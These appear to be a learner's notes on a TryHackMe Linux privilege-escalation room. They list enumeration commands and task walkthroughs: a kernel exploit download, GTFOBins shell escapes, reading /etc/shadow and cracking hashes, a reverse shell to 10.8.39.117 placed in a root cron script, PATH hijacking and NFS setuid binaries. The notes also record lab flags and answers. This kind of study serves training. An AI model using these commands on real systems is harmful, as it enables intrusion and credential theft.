Linux Privilege Escalation:
    * Definition "Exploitation of a vulnerability, design flaw or config oversight to gain unauthorised access to resources, usually restricted from users."
    * Going from low privileges to high.
    * Rare that a foothold will grant administrative access.
    * Therefore, very important for:
        [
            Resetting passwords
            Bypassing access controls to compromise protected data
            Editing software configurations
            Enabling persistence
            Changing the privilege of existing (or new) users
            Execute any administrative command
        ]

    "ENUMERATION:"
        * This is the first step upon gaining foothold. 

        Commands: (navigating linux)
        [hostname]                  Returns hostname of the target machine. Can provide information about the target systemâ€™s role 
        [uname -a]                  Prints system info, including details of kernel. 
        [/proc/version]             Provides info on the processes running on target system. Kernel info and more, whether a compiler is installed, (GCC).
        [/etc/issue]                Information about the operating system.

        [ps]                        process status. Output has PID, TTY (terminal type), Time (Amount of CPU time used), CMD (Command or executable running).
            [ps -A]                 Show all processes running.
            [ps axjf]               View process tree
            [ps aux]                Shows process for "A"ll users, "U"ser that ran the process, and shows processes not attached to terminal (X).

        [env]                       Shows environmental variables.
        [sudo -l]                   Shows all sudo commands that can be ran by current user.
        
        [ls]                        Show files and directories at current location.
            [ls -la]                Show all (including hidden) files and folders at current location.

        [id]                        Provide a general overview of privilege level & group memberships.
        [id OTHERUSER]              Provide general overview of privlege level & group memberships for OTHERUSER.

        [/etc/passwd]               Easy way to discover users on a system.
            [cat /etc/passwd | cut -d ":" -f 1]         Cut and convert etc/passwd, useful to create brute force list.
            [cat /etc/passwd | grep home]               Users likely have a home directory, hence grep for it! Shows users.

        [history]                   Shows previously entered commands.
        [ifconfig]                  Show network interface info. 
        [ip route]                  See which network routes exist.

        [netstat]                   Gather information on existing connections.
            [netstat -a]            Show all listening ports and established connections.
            [netstat -at]           List TCP protocols.
            [netstat -au]           List UDP protocols.
            [netstat -l]            List ports in listening mode. These are open and ready to accept incoming connections.
            [netstat -s]            List network usage statistics by protocol. add -t or -u to limit output to specific protocol.
            [netstat -tp]           List connections with service name and PID.
            [netstat -ano]          -a : Display all sockets    -n : Do not resolve names   -o : Display timers

        [find]                      Very useful for searching current directory
            [find . -name flag1.txt]        Tries to find flag within current directory.
            [find /home -name flag1.txt]    Find flag within home.
            [find / -type d -name config]   Find directory named config under "/"
            [find / -type f -perm 0777]     Find files with 777 permissions. These are readable, writeable, executable by all users.
            [find / -perm a=x]              Find executable files.
            [find /home -user frank]        Find all files for user frank under /home
            [find / -mtime 10]              Find files modified within the last 10 days.
            [find / -atime 10]              Find files accessed within last 10 days.
            [find / -cmin -60]              Find files changed within the last hour.
            [find / -amin -60]              Find files accessed within the last hour.
            [find / -size 50M]              Find files of size 50Mb
            [find / -size 50M]              Find files larger than 50Mb, use - for smaller than 50Mb.

            "NB find tends to produce errors, hence send these errors to /dev/null to get clean output:"   append [-type f 2>/dev/null]
                [find / -size +100M -type f 2>/dev/null]

            "Folders and files that can be written or executed from:"       These 3 do the same thing, helpful because perm changes how find works.
                [find / -writable -type d 2>/dev/null]      Find world writeable files
                [find / -perm -222 -type d 2>/dev/null]     
                [find / -perm -o w -type d 2>/dev/null]     

                [find / -perm -o x -type d 2>/dev/null]     Find world-executable folders.

            "Find development tools and supported languages"
                [find / -name perl*]
                [find / -name python*]
                [find / -name gcc*]

            "SUID bit being set, allows a file to be ran with the privilege of the account that owns it, not that of the account that runs it!"
                [find / -perm -u=s -type f 2>/dev/null]     Find files with SUID bit set, allows us to run file with higher priveleges than current user.
                
            "Other helpful general commands:"
                [find, locate, grep, cut, sort]



    "AUTOMATED ENUMERATION TOOLS:"
        * List of popular Linux enumeration tools:
                LinPeas:                            https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
                LinEnum:                            https://github.com/rebootuser/LinEnum
                LES (Linux Exploit Suggester):      https://github.com/mzet-/linux-exploit-suggester
                Linux Smart Enumeration:            https://github.com/diego-treitos/linux-smart-enumeration
                Linux Priv Checker:                 https://github.com/linted/linuxprivchecker 

        
    "Privilege Escalation: Kernel Exploits:"
        * Ideally, we want root privileges. Can be done by exploiting vulnerability, or by changing to a higher privilege user.
        * Unless a single vulnerability gives root priv, we are going to rely on misconfigurations and lax permissions.

        ** Kernel in Linux systems manages the communication between components such as memory on the systems and applications.
        ** Thus kernel must have specific privileges, suggesting a successful exploit will lead to root privileges.
        * The process for kernel exploits is:
            1.  Identify the kernel version
            2.  Search and find an exploit code for the kernel version of the target system
            3.  Run the exploit 

        ** FAILED KERNEL EXPLOIT CAN LEAD TO SYSTEM CRASH!

        Resources for Kernel exploits:
            * Previously used Exploit DB.  https://www.cvedetails.com/ 
            * Or use a script such as "LES" (Linux Exploit Suggester). Beware of false positives and negatives!

        Note when searching for vulnerabilities:
            [Being too specific about the kernel version when searching for exploits on Google, Exploit-db, or searchsploit]

            [Be sure you understand how the exploit code works BEFORE you launch it. 
            Some exploit codes can make changes on the operating system that would make 
            them unsecured in further use or make irreversible changes to the system, creating problems later. 
            Of course, these may not be great concerns within a lab or CTF environment, 
            but these are absolute no-nos during a real penetration testing engagement.]

            [Some exploits may require further interaction once they are run. 
            Read all comments and instructions provided with the exploit code.
            You can transfer the exploit code from your machine to the target system using the 
            SimpleHTTPServer Python module and wget respectively.]

            
"LOCAL IP"      []
"TARGET IP"     [10.10.186.135]
        "TASK 5 | Privilege Escalation: Kernel Exploits"
            "Start the Python server from the directory that contains the file!"
            * [python3 -m http.server 808]         On attacker, start web server
            * [cd ..]                               Navigate to /tmp
            * [wget 10.10.77.254:808/37292.c]      Gets file onto target through SSH!
            * [gcc 37292.c -o 37292]                Compile the file
            * [./37292]                             Run the exploit
            
        "Task 6 | Sudo"
        * [sudo -l]                                 Shows possible sudo options, shows FIND
        * "https://gtfobins.github.io/"             Curated list of Unix binaries that are exploited to bypass local restrictions on misconfigured system
        * [ssh karen@10.10.163.237]                 Start again.
        * [sudo find . -exec /bin/sh \; -quit]      TAKEN FROM GTFOBINS! Searched FIND and this gives root
        * [whoami]                                  Check that we now have root privileges
        ANSWER:     [THM-402028394]
        ANSWER:     [sudo nmap --interactive]

            "What is the hash of..."
            *** NB "ALL HASHES OF USERS PASSWORDS ARE LOCATED IN ETC/SHADOW!"
            * [cat etc/shadow]                          Examine user password hashes!
                    =>[$6$2.sUUDsOLIpXKxcr$eImtgFExyr2ls4jsghdD3DHLHHP9X50Iv.jNmwo/BJpphrPRJWjelWEz2HH.joV14aDEwW1c3CahzB1uaqeLR1:18796:0:99999:7:::]
            ANSWER:  "$6$2.sUUDsOLIpXKxcr$eImtgFExyr2ls4jsghdD3DHLHHP9X50Iv.jNmwo/BJpphrPRJWjelWEz2HH.joV14aDEwW1c3CahzB1uaqeLR1"


        "TASK 7 | SUID"
            * We want to search for files that have SUID bit set. These files are executables, "THEY ARE EXECUTED AS THE OWNER, NOT CURRENT USER!"
            [find / -type f -perm -04000 -ls 2>/dev/null]               Find files with SUID bit set
            [GTFObins, select filter for SUID]                          Compare with SUID files on system

            "What user shares name with comic book writer"
            [cat etc/passwd]                                            Show user info
            ANSWER:     [gerryconway]

            "What is the passw of User2"
            * Need privilege escalation. Therefore do the above SUID steps!
            * Looking at the SUID set files, overwhelming.
            * LOOK AT BASE64! GTFObins has a binary for this.
            [LFILE=/etc/shadow]
            [/usr/bin/base64 "$LFILE" | base64 --decode]

            => "user2:$6$m6VmzKTbzCD/.I10$cKOvZZ8/rsYwHd.pE099ZRwM686p/Ep13h7pFMBCG4t7IukRqc/fXlA1gHXh9F2CbwmD4Epi1Wgh.Cl.VV1mb/:18796:0:99999:7:::"
            HASH:       "$6$m6VmzKTbzCD/.I10$cKOvZZ8/rsYwHd.pE099ZRwM686p/Ep13h7pFMBCG4t7IukRqc/fXlA1gHXh9F2CbwmD4Epi1Wgh.Cl.VV1mb/"

            * Use
            [nano user2hash.txt]                Create file, paste hash into it
            [john user2hash.txt]                Crack password with john derper
            [john user2hash.txt --show]         Show passwords cracked
            ANSWER: "Password1"

            BELOW DIDNT WORK:
                [john --wordlist=/usr/share/wordlists/rockyou.txt user2hash]            User John Derper, rockyou wordlist to find password from hash
                [john --wordlist=/usr/share/wordlists/rockyou.txt user2hash --show]     If previously ran, use show option


            "WHAT IS THE FLAG3.TXT"
                * [cd home/ubuntu]
                * [cat flag3.txt]               PERMISSION DENIED!
                ** "Luckily, we just found a new user and password! use User2, Password1"

                [su user2]                      Change user to the found User2, enter password
                ** Still no good. Need to rerun SUID check, get root privileges and then read flag
                [find / -type f -perm -04000 -ls 2>/dev/null]               Find files with SUID bit set
                
                *** "REMEMBER BASE64 FROM BEFORE!"
                ** We can simply use base64 to read the flag directly.
                * [LFILE=/home/ubuntu/flag3.txt]
                * [/usr/bin/base64 "$LFILE" | base64 --decode]




        "TASK 8 | Priv Esc Capabilities"
            * Capabilities help manage privileges at a granular level.
            * Changing the privileges of the binary, rather than the whole user.
            
            * [getcap / -r 2>/dev/null]               NOTE  cap_setuid+ep! Shows binaries with set capabilities
            * Note vim and view have capabilities set
            ANSWER:     "view"


            * GTFO bins, filter capabilities, look for vim          
            * [./view -c ':python3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")']
                => view command not found
            "Need to specify full path of view at beginning of command"

            * [/home/ubuntu/view ./view -c ':python3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")']
            It worked!

            ANSWER: "THM-9349843"


        "TASK 9 | Cron Jobs"
            * Cron jobs are used to run scripts or binaries at a specific time.
            * By default, run with privileges of owner, not current user!
            ** If there is a scheduled task that runs with root privileges, change the script.
            * Therefore our script ran with root privs!

            [cat /etc/crontab]              Read system-wide cron jobs
            * NOTE "* * * * *  root /home/karen/backup.sh"
            ** This means backup.sh runs every minute!
            [cat backup.sh]                 Read the script, check if we can
            ** we want to edit script to setup a reverse shell
            "Change script contents to"
            [
                #!/bin/bash
                bash -i >& /dev/tcp/10.8.39.117/6666 0>&1
            ]


            ** Now lets set up a listener on our own machine
            [nc -nlvp 6666]
            []
            []


        "TASK 10 | Privilege Escalation with PATH"
            * If a folder for which our USER has write permission is located in PATH:
            * Could hijack an application to run a script!


            We want to know:
                1.  What folders are located under $PATH
                2.  Does your current user have write privileges for any of these folders?
                3.  Can you modify $PATH?
                4.  Is there a script/application you can start that will be affected by this vulnerability?



            [echo $PATH]                   Show PATH info
            Navigate to murdoch
            [ls]                            Shows binary test, executable thm.py
            [file test]
            [nano thm.py]                   Just executes a program called thm

            *** "If there is not path defined for the script, system looks in path variable
            tries to find match for that application! First one it finds."

            ** Note the flaw in thm.py "THERE IS NO DEFINED PATH!"
            * Create temporary directory in /usr/local/sbin, create binary called thm and put here.

            [export PATH=/tmp:$PATH]    Add tmp
            [echo $PATH]                Make sure tmp is added
            
             **"THIS MEANS SYSTEM WILL LOOK AT TMP FIRST WHEN TRYING TO FIND OUT BINARY THM"
            [ls -la /tmp]               Shows contents of tmp


            ** We need to create a binary under name thm within tmp directory.
            [cd /tmp]
            [nano thm]


            "BELOW SCRIPT CHANGES USER TO ROOT! NB"
"
#include<unistd.h>
void main()
{ setuid(0);
    setgid(0);
    system("/bin/bash");
    return 0;
}
            "
            ** We have created a binary called thm.
            [chmod -x thm]          Give it execute permissions
            [chmod -s thm]          Set SUID bit
            [cd /home]   

            **DIDNT WORK, try again, simpler
            [rm thm]                Get rid of old one
            [echo "/bin/bash" > thm]               
            [chmod 777 thm]         Change priv level to standard user. (Low privs)
            ** We want to execute thm. Because no path defined, will look within system and hopefully use our thm from tmp! (executing as root)
            [./thm]                 It worked! We are now 



    "TASK 11 | NFS (Network File Sharing)"
            * Privilege escalation is not limited to internal acccess. 
            * Shared folders and remote management interfaces such as SSH/ Telnet can give root access!
            ** "MISCONFIGURED NETWORK SHELL!"

            * NFS is located in [/etc/exports] created during NFS install, accessible to users (typically).
            ** [no_root_squash] IS CRUCIAL! By default, NFS changes root user -> nsfnobody. Strips sudo privileges.
            * If [no_root_squash] is present on a WRITEABLE SHARE, we can create an execut with SUID and run on target.


            "TASK STEPS WALKTHROUGH"
            * [cat /etc/exports]            ON TARGET MACHINE
            * [sudo -i]                     ON ATTACKMACHINE, change to sudo
            * [cd /] [cd mnt]               Change dir to mount
            * [mkdir jrpentest]             Make directory for share to be mounted
            * [mount -o rw 10.10.181.133:/home/ubuntu/sharedfolder /mnt/jrpentest]    Define dir on attackbox, mount share
            
            * [cd jrpentest]            
            
            "NOW WE NEED TO WRITE THE SIMPLE SCRIPT TO ESCALATE PRIVILEGES"
            * [nano nfs.c]
            ... insert below script


            "ATTACKBOX IP:"     10.8.39.117

            Steps:
                1.  [showmount -e TARGET_IP]                    Enumerate mountable shares from attackbox.
                2.  [mkdir /tmp/backupsonattackermachine]       Make temp dir on attackbox. 
                    [mount -o rw TARGET_IP:/backups /tmp/backupsonattackermachine]      Mount

                3.  [nano nfs.c                                 Simple executable to run bin/bash
                    
                    #include <stdio.h>
                    #include <stdlib.h>
                    #include <unistd.h>

                    int main (void) {
                        setguid(0);
                        setuid(0);
                        system("/bin/bash -p");
                        return 0;
                    }
                ]


                4.  [gcc nfs.c -o nfs -w]                       Compile it


                ** "NOW GO TO TARGET MACHINE, CHECK /home/ubuntu/sharedfolder"
                * [ls]                      Should now see nfs, nfs.c on target sharedfolder!
                
                [chmod +s nfs]  [chmod +x nfs]              Set SUID bit
                [ls -l]                                     Check
                
                